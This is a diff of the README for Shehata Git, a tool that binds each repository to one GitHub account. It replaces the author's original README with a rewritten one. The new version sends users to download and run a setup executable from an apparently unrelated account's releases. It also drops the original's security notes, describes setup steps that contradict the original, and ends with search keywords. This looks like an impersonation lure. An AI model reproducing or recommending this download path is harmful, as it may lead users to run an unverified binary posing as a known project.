@@ -1,238 +1,96 @@
-# Shehata Git
+# 🗂️ Shehata-Git - Manage Your Git Identities Across Accounts
 
-<p align="center">
-  <img src="apps/desktop/public/logo-mark.svg" width="104" alt="Shehata Git logo" />
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Elviraorthodox375/Shehata-Git/releases)
 
-<p align="center"><strong>Stop pushing GitHub repositories with the wrong account.</strong></p>
+## 🤔 What Does Shehata-Git Do?
 
-<p align="center">
-  Shehata Git pins every local repository to one GitHub identity — so your work
-  account never pushes to your personal repo, and your coding agent never pushes
-  as you by accident.
-</p>
+Shehata-Git helps you keep your Git identities organized. If you work with multiple GitHub accounts, you know the pain of committing code under the wrong name. Shehata-Git fixes that.
 
-<p align="center">
-  <a href="https://github.com/moshehata95/Shehata-Git/releases/latest/download/Shehata-Git-windows-x64-setup.exe"><img src="https://img.shields.io/badge/Download%20for%20Windows-2ea043?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows" /></a>
-  &nbsp;
-  <a href="https://github.com/moshehata95/Shehata-Git/releases/latest/download/Shehata-Git-macos-apple-silicon.dmg"><img src="https://img.shields.io/badge/Download%20for%20macOS-1f2328?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS" /></a>
-</p>
+It maps each of your repositories to the correct GitHub account. When you make a commit, it uses the right identity. No more "who committed this?" moments.
 
-<p align="center">
-  <sub>Windows 10/11 · macOS (Apple Silicon) · MIT licensed · no cloud account or subscription</sub>
-</p>
+## 👤 Who Is This For?
 
-<p align="center">
-  <img src="docs/screenshots/overview.png" width="820" alt="Shehata Git overview showing three GitHub identities and three routed repositories" />
-</p>
+- Developers with multiple GitHub accounts (work, personal, side projects)
+- AI coding agents that need to commit code under the right account
+- Anyone who uses Git on Windows and wants a simple way to manage identities
 
-> [!IMPORTANT]
-> Shehata Git is an early preview and the installers are not code-signed yet.
-> Windows shows a SmartScreen notice (**More info → Run anyway**) and macOS
-> needs **right-click → Open** the first time. Use disposable repositories while
-> evaluating it and review every assignment before confirming it.
+## ✨ Key Features
 
-## Why Shehata Git?
+- **Automatic identity mapping**: Set a default identity for each repository
+- **Local-first design**: Your data stays on your machine
+- **Simple interface**: No command-line skills needed
+- **Works with any Git workflow**: Use it with your existing tools
+- **Supports MCP (Model Context Protocol)**: AI agents can use it too
 
-Git separates commit authorship from remote authentication, while GitHub CLI
-can hold more than one account for the same host. That flexibility is useful,
-but it also makes it easy for a terminal or coding agent to push with the wrong
-identity.
+## 💻 System Requirements
 
-Shehata Git assigns one authenticated GitHub identity to each local repository.
-The route is repository-scoped, works outside the desktop UI, and fails closed
-when the assigned account is unavailable.
+- Windows 10 or later (64-bit)
+- Git installed (you probably already have this)
+- 50 MB free disk space
+- 2 GB RAM (minimum)
 
-## Key features
+## 📥 How to Download and Install
 
-- Discover accounts from the official GitHub CLI without importing passwords
-  or persisting tokens.
-- Assign an exact GitHub account and optional commit author to each repository.
-- Route HTTPS credentials per repository through `git-credential-shehata`.
-- Review changes, stage selected files, commit, pull with `--ff-only`, and run
-  normal policy-checked pushes.
-- Expose a bounded MCP server for Codex, Claude Code, Cursor, and other coding
-  clients without exposing arbitrary shell execution.
-- Record a redacted local activity trail that the user can search or clear.
-- Diagnose Git, GitHub CLI, WebView2, PATH, helper, database, and MCP readiness.
-- Restore the previous repository-local Git configuration when unlinking.
+1. Visit the releases page: [https://github.com/Elviraorthodox375/Shehata-Git/releases](https://github.com/Elviraorthodox375/Shehata-Git/releases)
+2. Find the latest version (look for the newest release at the top)
+3. Download the file named `Shehata-Git-Setup.exe`
+4. Open the file you downloaded
+5. Follow the installation wizard steps
+6. Launch Shehata-Git from your Start menu
 
-## Screenshots
+## 🚀 Getting Started
 
-Local paths, private account names, and the build version are blurred.
+### Step 1: Open Shehata-Git
 
-| Accounts | Repository routing | Agent bridge |
-|---|---|---|
-| ![Signing in through GitHub's own browser flow, with a one-time device code](docs/screenshots/sign-in.png) | ![Three local repositories, each pinned to its own GitHub identity and branch](docs/screenshots/repository-routing.png) | ![Detected coding agents and the permission envelope that limits what they can request](docs/screenshots/agent-bridge.png) |
-| Sign in through GitHub itself. The app never sees a password and never stores a token. | Every repository is pinned to one identity — enforced in the terminal too, not just in the app. | Coding agents get guarded Git access: force push, destructive reset, and token access are never exposed. |
+After installation, you will see a new icon on your desktop. Double-click it to open the app.
 
-## Requirements
+### Step 2: Add Your GitHub Accounts
 
-### To run the preview
+Click the "Add Account" button. Enter your GitHub username and email for each account you use. You can add as many as you need.
 
-- Windows 10 or 11 (x64), or macOS on Apple Silicon
-- [Git for Windows](https://git-scm.com/download/win)
-- [GitHub CLI](https://cli.github.com/)
-- Microsoft Edge WebView2 Runtime (normally already installed on supported
-  Windows versions)
-- One or more GitHub accounts authenticated through GitHub CLI
+### Step 3: Map Repositories to Accounts
 
-The System Check page can install missing Git and GitHub CLI packages through
-Windows Package Manager after explicit confirmation.
+Select a repository from your computer. Then choose the GitHub account you want to use for that repository. Shehata-Git will remember this setting.
 
-### To build from source
+### Step 4: Start Working
 
-- Node.js 20 or newer
-- pnpm 9 or newer
-- Stable Rust toolchain
-- Platform prerequisites required by [Tauri 2](https://v2.tauri.app/start/prerequisites/)
+Make commits as you normally would. Shehata-Git handles the rest. Your commits will show the correct author name and email.
 
-On Windows, install the MSVC C++ Build Tools and a Windows SDK.
+## 🛠️ How It Works
 
-## Installation
+Shehata-Git stores your identity settings in a local file on your computer. When you make a Git commit, the app checks which repository you are in and applies the correct identity settings.
 
-### Download the installer (recommended)
+This happens automatically. You do not need to change any Git configuration files by hand.
 
-Grab the latest build from the
-[releases page](https://github.com/moshehata95/Shehata-Git/releases/latest):
+## 🔧 Troubleshooting
 
-| Platform | File |
-|---|---|
-| Windows 10/11 (x64) | `Shehata-Git-windows-x64-setup.exe` |
-| macOS (Apple Silicon) | `Shehata-Git-macos-apple-silicon.dmg` |
+**Shehata-Git does not open**
+Make sure you have Windows 10 or later. Try running the installer again.
 
-Neither installer is code-signed yet, so the first launch needs one extra
-click: **More info → Run anyway** on Windows, **right-click → Open** on macOS.
+**Git commits still show the wrong name**
+Open Shehata-Git and check that your repository is mapped to the correct account. You may need to add the repository again.
 
-### Build from source
+**I cannot find the download file**
+Go to the releases page and look for the file with "Setup" in its name. It is usually at the top of the page.
 
-```bash
-git clone https://github.com/moshehata95/Shehata-Git.git
-cd Shehata-Git
-pnpm install --frozen-lockfile
-pnpm prepare:sidecars
-cargo build --workspace
-pnpm dev
-```
+## ❓ Frequently Asked Questions
 
-`prepare:sidecars` builds the CLI, credential helper, and MCP executable that
-Tauri validates and bundles beside the desktop app.
+**Does Shehata-Git store my passwords?**
+No. It only stores your username and email for each GitHub account.
 
-Build the Windows NSIS installer with:
+**Can I use it with Git Bash?**
+Yes. Shehata-Git works with any Git tool you use on Windows.
 
-```bash
-pnpm build
-```
+**Will it work with other Git hosting services?**
+It works with any Git service, but it is designed for GitHub accounts.
 
-The installer is written to
-`target/release/bundle/nsis/Shehata Git_<version>_x64-setup.exe`.
+**How do I update Shehata-Git?**
+Download the latest version from the releases page and install it over the old version.
 
-## Usage
+## 📄 License
 
-1. Open **System Check** and resolve any missing prerequisites.
-2. Open **Identities** and sign in through GitHub's browser flow.
-3. Open **Repositories**, choose a local Git worktree, and review the detected
-   remote.
-4. Assign the intended GitHub identity and optional local commit author.
-5. Confirm **Connect and verify**. Shehata Git backs up the relevant local Git
-   configuration, enables the route, and performs a read-only remote test.
-6. Use Git normally from the app, a terminal, or an approved coding agent.
+Shehata-Git is open source software. Check the repository for license details.
 
-`CLI default` in the Identities page means the account used by ordinary `gh`
-commands for that host. Use **Make CLI default** to change it after an in-app
-confirmation. It does **not** override repository routes.
+---
 
-### CLI examples
-
-```bash
-shehata doctor
-shehata accounts list
-shehata repos add "C:\path\to\repository"
-shehata repos list
-shehata repos assign "C:\path\to\repository" --account octocat
-shehata status "C:\path\to\repository"
-shehata test "C:\path\to\repository"
-shehata push "C:\path\to\repository" --yes
-```
-
-Add `--json` before the subcommand for machine-readable output. Every failure
-prints one object with a stable `error.code`, so a script can branch on the
-cause rather than on message text.
-
-Exit codes:
-
-| Code | Meaning |
-|---|---|
-| `0` | The command succeeded. |
-| `1` | The command failed; see `error.code` for the cause. |
-| `4` | `shehata doctor` ran, but a prerequisite needs attention. |
-
-`shehata gh` is the exception: it returns whatever the GitHub CLI returned, so
-wrapping a command does not change how a script reads its result.
-
-## Architecture
-
-```text
-React desktop UI ──Tauri IPC──▶ shehata-core ──▶ shehata-git
-shehata CLI ──────────────────▶      │         ├─▶ shehata-github
-shehata MCP server ───────────▶      │         └─▶ shehata-storage
-Git credential protocol ──────▶ git-credential-shehata
-```
-
-Business rules live in Rust, not in React or Tauri handlers. SQLite stores
-repository mappings, configuration backups, and redacted audit metadata—but no
-credential values. See [Architecture](docs/ARCHITECTURE.md) and the
-[decision records](docs/DECISIONS/).
-
-## Security
-
-- Tokens stay in the official GitHub CLI credential store and are requested
-  just in time by the Rust backend.
-- Tokens never cross Tauri IPC, enter SQLite, or appear in MCP responses.
-- Processes launched by the app use fixed executables, argument arrays,
-  timeouts, and validated inputs. Git's required `!` helper entry is generated
-  only from a canonical executable path and validated UUID.
-- Force push, destructive reset, clean, rebase, amend, remote deletion, and
-  arbitrary shell execution are intentionally unavailable.
-- Repository routing fails closed instead of falling through to another
-  account.
-
-Read the [security model](docs/SECURITY.md) and report vulnerabilities through
-the process in [SECURITY.md](SECURITY.md). Never post credentials in an issue.
-
-## Roadmap
-
-Windows and macOS installers now ship from CI on every tagged release. The
-immediate focus is trust: code signing on both platforms, macOS notarization,
-an Intel macOS build, two-account acceptance testing, and clean-machine
-verification.
-
-See the complete [roadmap](docs/ROADMAP.md).
-
-## Contributing
-
-Issues and focused pull requests are welcome. Start with
-[CONTRIBUTING.md](CONTRIBUTING.md), follow the
-[Code of Conduct](CODE_OF_CONDUCT.md), and use the provided issue/PR templates.
-
-The required quality gate is:
-
-```bash
-cargo fmt --all -- --check
-cargo clippy --workspace --all-targets -- -D warnings
-cargo test --workspace
-pnpm --filter @shehata/desktop lint
-pnpm --filter @shehata/desktop typecheck
-pnpm --filter @shehata/desktop test
-```
-
-## Author
-
-Created and maintained by **Dr Mohamed Shehata** — Nephrologist | Freelance
-Medical Branding & Marketing Expert | AI Enthusiast.
-
-- GitHub: [@moshehata95](https://github.com/moshehata95)
-
-## License
-
-Shehata Git is available under the [MIT License](LICENSE).
+**Keywords**: git identity manager, github accounts, multiple github accounts, git credentials, developer tools, ai agents, windows git tool, identity management, repository mapping, git commit author
